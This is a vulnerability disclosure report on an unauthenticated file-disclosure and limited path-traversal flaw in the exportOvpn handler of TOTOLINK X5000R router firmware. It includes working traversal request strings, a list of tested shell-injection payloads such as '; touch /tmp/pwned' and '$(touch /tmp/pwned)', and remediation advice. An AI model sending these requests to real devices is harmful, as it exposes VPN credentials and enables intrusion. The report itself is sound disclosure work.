# Technical Report: TOTOLINK X5000R `exportOvpn` File Disclosure and Limited Path Traversal

## Target

Product:

```text
TOTOLINK X5000R
```

Verified affected versions:

```text
V9.1.0cu.2415_B20250515
V9.1.0cu.2350_B20230313
```

Affected component:

```text
/web/cgi-bin/cstecgi.cgi
```

## Vulnerability Class

Suggested CWE:

```text
CWE-862: Missing Authorization
CWE-22: Improper Limitation of a Pathname to a Restricted Directory
CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
```

## Root Cause

The `exportOvpn` branch in `cstecgi.cgi` is reachable before the normal web token/session authentication path. The handler parses fixed-position query arguments, extracts a user-controlled name value, and uses it both in an OpenVPN export command and in a file path.

Observed strings and behavior:

```text
exportOvpn
openvpn-cert build_user %s gz
/etc/openvpn/server/user/%s.tar.gz
openvpn-cert build_user %s config
/etc/openvpn/server/user/%s.ovpn
can not open config file
```

Effective vulnerable logic:

```c
system("openvpn-cert build_user <username> config");
fopen("/etc/openvpn/server/user/<username>.ovpn", "rb");

system("openvpn-cert build_user <username> gz");
fopen("/etc/openvpn/server/user/<username>.tar.gz", "rb");
```

The username is not normalized as a path component, and directory boundaries are not enforced before opening the final path.

## Verified Behavior

Representative successful responses from QEMU/chroot CGI execution:

```text
exportOvpn&type=user&name=alice&mode=config
HTTP/1.1 200 OK
OVPN_SECRET_FOR_ALICE

exportOvpn&type=user&name=alice&filetype=gz
HTTP/1.1 200 OK
TARGZ_SECRET_FOR_ALICE

exportOvpn&type=user&name=../passwd&mode=config
HTTP/1.1 200 OK
TRAVERSAL_SECRET

exportOvpn&type=user&name=../passwd&filetype=gz
HTTP/1.1 200 OK
TRAVERSAL_GZ_SECRET
```

Command log confirms branch reachability:

```text
openvpn-cert build_user alice config
openvpn-cert build_user alice gz
openvpn-cert build_user ../passwd config
openvpn-cert build_user ../passwd gz
```

## Boundary Conditions

This issue is not a fully arbitrary file read. The requested file is constrained by forced suffixes:

```text
mode=config  -> .ovpn
filetype=gz  -> .tar.gz
```

Examples:

```text
name=../passwd&mode=config     -> /etc/openvpn/server/user/../passwd.ovpn
name=../passwd&filetype=gz     -> /etc/openvpn/server/user/../passwd.tar.gz
```

Current evidence does not support RCE. Tested shell metacharacter categories include:

```text
; touch /tmp/pwned
| touch /tmp/pwned
`touch /tmp/pwned`
$(touch /tmp/pwned)
raw LF / CR / tab
URL-encoded %3b, %7c, %26, %0a
filetype/type parameter injection
```

These tests did not produce command execution in the available evidence.

## Runtime Preconditions

Practical impact depends on runtime OpenVPN state. The vulnerable file-return logic is meaningful when at least one of the following is true:

```text
/etc/openvpn/server/user/<name>.ovpn exists
/etc/openvpn/server/user/<name>.tar.gz exists
openvpn-cert build_user <name> config/gz can generate the export
suffix-matching sensitive files exist outside the user directory
```

The local harness pre-created representative files to model a configured device, because the firmware image does not include user-generated OpenVPN export files by default.

## Suggested Severity

Suggested CVSS v3.1:

```text
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = 7.5 High
```

The score assumes OpenVPN profiles or archives contain sensitive VPN access material. If the runtime dependency is considered limiting, confidentiality impact may be reduced.

## Remediation

1. Move `exportOvpn` behind the same token/session authentication as privileged web actions.
2. Enforce a strict username allowlist such as `^[A-Za-z0-9_-]{1,64}$`.
3. Normalize the final path and verify it remains under `/etc/openvpn/server/user/`.
4. Do not allow unauthenticated requests to invoke `openvpn-cert build_user`.
5. Avoid `system()` string concatenation; use argument-vector execution APIs where possible.

